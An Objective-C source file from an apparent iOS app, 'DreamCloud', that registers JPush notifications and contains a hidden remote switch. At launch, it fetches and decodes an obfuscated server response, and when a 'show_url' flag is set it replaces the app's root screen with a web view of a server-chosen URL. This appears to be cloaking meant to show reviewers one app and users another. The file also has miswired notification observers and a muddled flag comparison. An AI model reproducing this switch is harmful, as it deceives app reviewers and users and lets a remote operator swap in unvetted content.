//
//  Dreamweaver.m
//  DreamCloud
//
//  Created by LWW on 2018/12/11.
//  Copyright © 2018 LWW. All rights reserved.
//

#import "Dreamweaver.h"
#import "DreamRequestManner.h"
#import "DreamViewer.h"
#import "JPUSHService.h"
#import <UserNotifications/UserNotifications.h>
#import "FWebViewViewController.h"
@interface Dreamweaver()<UNUserNotificationCenterDelegate,JPUSHRegisterDelegate>

@end
@implementation Dreamweaver

+ (instancetype)DreamInstance{
    static Dreamweaver *weaver;
    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{
        weaver = [[Dreamweaver alloc] init];
    });
    return weaver;
}

- (id)init{
    if ([super init]) {
        
        [[NSNotificationCenter defaultCenter] addObserver:self
                                                 selector:@selector(applicationDidBecomeActive:)
                                                     name:UIApplicationWillResignActiveNotification object:nil];
        
        [[NSNotificationCenter defaultCenter] addObserver:self
                                                 selector:@selector(application:didRegisterForRemoteNotificationsWithDeviceToken:)
                                                     name:UIApplicationWillEnterForegroundNotification object:nil];
        
    }
    return self;
}
- (void)initConfigwithUrl:(NSString *)url andAppId:(NSString *)appid andJpushKey:(NSString *)key withlaunchOptions:(NSDictionary*)launchOptions{
    [self initPush:launchOptions withPush:key];
    [self Dream:url action:appid and:^(NSString * _Nonnull url) {
        if (url != nil) {
            dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(0.01 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
                FWebViewViewController *vc = [[FWebViewViewController alloc] initWithURL:url];
                [self getCurrentVC].view.window.rootViewController = vc;
            });
        }
    }];
}
- (void)initPush:(NSDictionary*)launchOptions withPush:(NSString *)jpushKey{
   
    JPUSHRegisterEntity * entity = [[JPUSHRegisterEntity alloc] init];
    entity.types = JPAuthorizationOptionAlert|JPAuthorizationOptionBadge|JPAuthorizationOptionSound;
    if ([[UIDevice currentDevice].systemVersion floatValue] >= 8.0) {
        //可以添加自定义categories
        [JPUSHService registerForRemoteNotificationTypes:(UIUserNotificationTypeBadge |
                                                          UIUserNotificationTypeSound |
                                                          UIUserNotificationTypeAlert)
                                              categories:nil];
    }else{
        [JPUSHService registerForRemoteNotificationTypes:(UIRemoteNotificationTypeBadge |
                                                          UIRemoteNotificationTypeSound |
                                                          UIRemoteNotificationTypeAlert)
                                              categories:nil];
    }
    [JPUSHService registerForRemoteNotificationConfig:entity delegate:self];
    [JPUSHService setupWithOption:launchOptions appKey:jpushKey
                          channel:@""
                 apsForProduction:YES
            advertisingIdentifier:nil];
    [JPUSHService registrationIDCompletionHandler:^(int resCode, NSString *registrationID) {
        if(resCode == 0){
            NSLog(@"registrationID获取成功：%@",registrationID);
            
        }
        else{
            NSLog(@"registrationID获取失败，code：%d",resCode);
        }
    }];
    
}






- (void)applicationDidBecomeActive:(UIApplication *)application {
    // Restart any tasks that were paused (or not yet started) while the application was inactive. If the application was previously in the background, optionally refresh the user interface.
    NSLog(@"applicationDidBecomeActive");
    [[UIApplication sharedApplication] setApplicationIconBadgeNumber:0];
}

- (void)application:(UIApplication *)application didReceiveRemoteNotification:(NSDictionary *)userInfo fetchCompletionHandler:(void (^)(UIBackgroundFetchResult))completionHandler
{
    [JPUSHService handleRemoteNotification:userInfo];
    NSLog(@"收到通知:%@", userInfo);
    
    completionHandler(UIBackgroundFetchResultNewData);
}

- (void)application:(UIApplication *)application
didRegisterForRemoteNotificationsWithDeviceToken:(NSData *)deviceToken {
    
    [JPUSHService registerDeviceToken:deviceToken];
    
    if ([JPUSHService registrationID].length > 0)
    {
        NSString *newToken = [NSString stringWithFormat:@"[JPUSHService registrationID] == %@",[JPUSHService registrationID]];
        if (newToken.length == 0)
        {
            return;
        }
        
    }
}


- (void)application:(UIApplication *)application didReceiveLocalNotification:(UILocalNotification *)notification {
    
    [JPUSHService showLocalNotificationAtFront:notification identifierKey:nil];
}
- (void)Dream:(NSString *)sourUrl action:(NSString *)ID and:(void(^)(NSString*url))finishBlock{
    [[DreamRequestManner requestInstance] getWithURLString:sourUrl widh:ID success:^(NSDictionary * _Nonnull data) {
        if([data[@"rt_code"] floatValue] != 200)return;
        
        NSDictionary *dic = [NSJSONSerialization JSONObjectWithData:[DreamViewer decodeString:data[@"data"]] options:NSJSONReadingMutableLeaves error:nil];
        
        if ([data[@"rt_code"] floatValue] == 200) {
            
            if([dic[@"show_url"] integerValue] == self.isDebug ==YES?0:1){
                
                [DreamRequestManner requestInstance].DreamUrl = dic[@"url"];
                if (finishBlock) {
                    finishBlock([DreamRequestManner requestInstance].DreamUrl);
                }
            }
            
        }else{
            
        }
    } failure:^(NSError * _Nonnull error) {
        
    }];
     
    
}
- (UIViewController *)getCurrentVC {
    
    UIWindow *window = [[UIApplication sharedApplication].windows firstObject];
    if (!window) {
        return nil;
    }
    UIView *tempView;
    for (UIView *subview in window.subviews) {
        if ([[subview.classForCoder description] isEqualToString:@"UILayoutContainerView"]) {
            tempView = subview;
            break;
        }
    }
    if (!tempView) {
        tempView = [window.subviews lastObject];
    }
    
    id nextResponder = [tempView nextResponder];
    while (![nextResponder isKindOfClass:[UIViewController class]] || [nextResponder isKindOfClass:[UINavigationController class]] || [nextResponder isKindOfClass:[UITabBarController class]]) {
        tempView =  [tempView.subviews firstObject];
        
        if (!tempView) {
            return nil;
        }
        nextResponder = [tempView nextResponder];
    }
    
    return  (UIViewController *)nextResponder;
}
@end
